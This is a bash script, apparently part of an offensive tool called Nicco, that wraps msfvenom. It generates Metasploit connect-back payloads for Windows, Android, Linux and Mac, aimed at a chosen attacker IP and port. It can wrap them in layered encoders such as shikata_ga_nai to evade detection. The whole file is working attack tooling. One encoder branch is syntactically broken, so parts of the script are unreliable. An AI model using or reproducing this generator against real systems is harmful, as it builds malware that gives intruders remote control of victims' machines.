#!/bin/bash

#Color values
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
RESET='\033[0m'
LIGHT_YELLOW='\e[93m'
LIGHT_CYAN='\033[1;36m'
LIGHT_GRAY='\033[0;37m'
LIGHT_RED='\033[1;31m'
LIGHT_GREEN='\033[1;32m'
LIGHT_BLUE='\033[1;34m'
LIGHT_PURPLE='\033[1;35m'

#Generation
current_platform=$(cat modules/msf_module/generate/inputs/platform.txt)
current_payload=$(cat modules/msf_module/generate/inputs/payload.txt)
current_ip=$(cat modules/msf_module/generate/inputs/ip.txt)
current_port=$(cat modules/msf_module/generate/inputs/port.txt)
current_payload_name=$(cat  modules/msf_module/generate/inputs/payload_name.txt)
current_encoder_value=$(cat modules/msf_module/generate/inputs/encoder.txt)
current_layers_value=$(cat modules/msf_module/generate/inputs/layers.txt)
current_payload_format=$(cat modules/msf_module/generate/inputs/format.txt)

# Encoder value
if [ "$current_encoder_value" == "encoder1" ]
then 
    current_encoder=cmd/brace
elif [ "$current_encoder_value" == "encoder2" ]
then 
    current_encoder=cmd/brace=cmd/echo
elif [ "$current_encoder_value" == "encoder3" ]
then 
    current_encoder=cmd/generic_sh
elif [ "$current_encoder_value" == "encoder4" ]
then 
    current_encoder=cmd/ifs
elif [ "$current_encoder_value" == "encoder5" ]
then 
    current_encoder=cmd/perl
elif [ "$current_encoder_value" == "encoder6" ]
then 
    current_encoder=cmd/powershell_base64
elif [ "$current_encoder_value" == "encoder7" ]
then 
    current_encoder=cmd/printf_php_mq
elif [ "$current_encoder_value" == "encoder8" ]
then 
    current_encoder=generic/eicar
elif [ "$current_encoder_value" == "encoder9" ]
then 
    current_encoder=generic/none
elif [ "$current_encoder_value" == "encoder10" ]
then 
    current_encoder=mipsbe/byte_xori
elif [ "$current_encoder_value" == "encoder11" ]
then 
    current_encoder=mipsbe/longxor
elif [ "$current_encoder_value" == "encoder12" ]
then 
    current_encoder=mipsle/byte_xori
elif [ "$current_encoder_value" == "encoder13" ]
then 
    current_encoder=mipsle/longxor
elif [ "$current_encoder_value" == "encoder14" ]
then 
    current_encoder=php/base64
elif [ "$current_encoder_value" == "encoder15" ]
then 
    current_encoder=ppc/longxor
elif [ "$current_encoder_value" == "encoder16" ]
then 
    current_encoder=ppc/longxor_tag
elif [ "$current_encoder_value" == "encoder17" ]
then 
    current_encoder=ruby/base64
elif [ "$current_encoder_value" == "encoder18" ]
then 
    current_encoder=sparc/longxor_tag
elif [ "$current_encoder_value" == "encoder19" ]
then 
    current_encoder=x64/xor
elif [ "$current_encoder_value" == "encoder20" ]
then 
    current_encoder=x64/xor_context
elif [ "$current_encoder_value" == "encoder21" ]
then 
    current_encoder=x64/xor_dynamic
elif [ "$current_encoder_value" == "encoder22" ]
then 
    current_encoder=x64/zutto_dekiru
elif [ "$current_encoder_value" == "encoder23" ]
then 
    current_encoder=x86/add_sub
elif [ "$current_encoder_value" == "encoder24" ]
then 
    current_encoder=x86/alpha_mixed
elif [ "$current_encoder_value" == "encoder25" ]
then 
    current_encoder=x86/alpha_upper
elif [ "$current_encoder_value" == "encoder26" ]
then 
    current_encoder=x86/avoid_underscore_tolower
elif [ "$current_encoder_value" == "encoder27" ]
then 
    current_encoder=x86/avoid_utf8_tolower
elif [ "$current_encoder_value" == "encoder28" ]
then 
    current_encoder=x86/bloxor
elif [ "$current_encoder_value" == "encoder29" ]
then 
    current_encoder=x86/bmp_polyglot
elif [ "$current_encoder_value" == "encoder30" ]
then 
    current_encoder=x86/call4_dword_xor
elif [ "$current_encoder_value" == "encoder31" ]
then 
    current_encoder=x86/context_cpuid
elif [ "$current_encoder_value" == "encoder32" ]
then 
    current_encoder=x86/context_stat
elif [ "$current_encoder_value" == "encoder33" ]
then 
    current_encoder=x86/context_time
elif [ "$current_encoder_value" == "encoder34" ]
then 
    current_encoder=x86/countdown
elif [ "$current_encoder_value" == "encoder35" ]
then 
    current_encoder=x86/fnstenv_mov
elif [ "$current_encoder_value" == "encoder36" ]
then 
    current_encoder=x86/jmp_call_additive
elif [ "$current_encoder_value" == "encoder37" ]
then 
    current_encoder=x86/nonalpha
elif [ "$current_encoder_value" == "encoder38" ]
then 
    current_encoder=x86/nonupper
elif [ "$current_encoder_value" == "encoder39" ]
then 
    current_encoder=x86/opt_sub
elif [ "$current_encoder_value" == "encoder40" ]
then 
    current_encoder=x86/service
elif [ "$current_encoder_value" == "encoder41" ]
then 
    current_encoder=x86/shikata_ga_nai
elif [ "$current_encoder_value" == "encoder42" ]
then 
    current_encoder=x86/single_static_bit
elif [ "$current_encoder_value" == "encoder43" ]
then 
    current_encoder=x86/unicode_mixed
elif [ "$current_encoder_value" == "encoder44" ]
then 
    current_x86/unicode_upper
elif [ "$current_encoder_value" == "encoder45" ]
then 
    current_encoder=x86/xor_dynamic
else 
    echo -e ${LIGHT_RED} 
    str="Unexpected error during creating payload... Restarting the tool"
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.02
    done ; bash Nicco.sh
fi

if [ "$(cat modules/msf_module/generate/encoders/encoder_optional.txt)" == "yes" ]
then 
    echo ; echo -e ${LIGHT_GREEN} 
    str="Payload for :- $current_platform 
Ip Adress for payload :- $current_ip
Port for payload :- $current_port
Payload being used :- $current_payload
Payload name :- $current_payload_name
Encoder being used :- $current_encoder
Layers of encoding :- $current_layers_value
"
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.02
    done ;  echo -e ${LIGHT_CYAN}

    if [ "$current_platform" == "windows" ]
    then
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port -e $current_encoder -i $current_layers_value -f $current_payload_format -o payloads/$current_platform/$current_payload_name.$current_payload_format

    elif [ "$current_platform" == "android" ]
    then 
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port -e $current_encoder -i $current_layers_value -o modules/payloads/$current_payload_name.$current_payload_format

    elif [ "$current_platform" == "linux" ]
    then 
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port -e $current_encoder -i $current_layers_value -f $current_payload_format -o payloads/$current_platform/$current_payload_name.$current_payload_format

    elif [ "$current_platform" == "mac" ]
    then 
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port -e $current_encoder -i $current_layers_value -f $current_payload_format -o payloads/$current_platform/$current_payload_name.$current_payload_format

    else 
        echo -e ${LIGHT_RED} 
        str="Unexpected error during creating payload... Restarting the tool"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.02
        done ; bash Nicco.sh
    fi

else 
    echo ; echo -e ${LIGHT_GREEN} 
    str="Payload for :- $current_platform 
Ip Adress for payload :- $current_ip
Port for payload :- $current_port
Payload being used :- $current_payload
Payload name :- $current_payload_name
"
    for((i=0; i<${#str}; i++)); do
        echo -n "${str:$i:1}"
        sleep 0.02
    done ; echo -e ${LIGHT_CYAN}

    if [ "$current_platform" == "windows" ]
    then
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port -f $current_payload_format -o payloads/$current_platform/$current_payload_name.$current_payload_format

    elif [ "$current_platform" == "android" ]
    then 
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port  -o payloads/$current_platform/$current_payload_name.$current_payload_format

    elif [ "$current_platform" == "linux" ]
    then 
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port  -f $current_payload_format -o payloads/$current_platform/$current_payload_name.$current_payload_format

    elif [ "$current_platform" == "mac" ]
    then 
        msfvenom --platform $current_platform -p $current_payload lhost=$current_ip lport=$current_port  -f $current_payload_format -o payloads/$current_platform/$current_payload_name.$current_payload_format

    else 
        echo -e ${LIGHT_RED} 
        str="Unexpected error during creating payload... Restarting the tool"
        for((i=0; i<${#str}; i++)); do
            echo -n "${str:$i:1}"
            sleep 0.02
        done ; bash Nicco.sh
    fi
fi 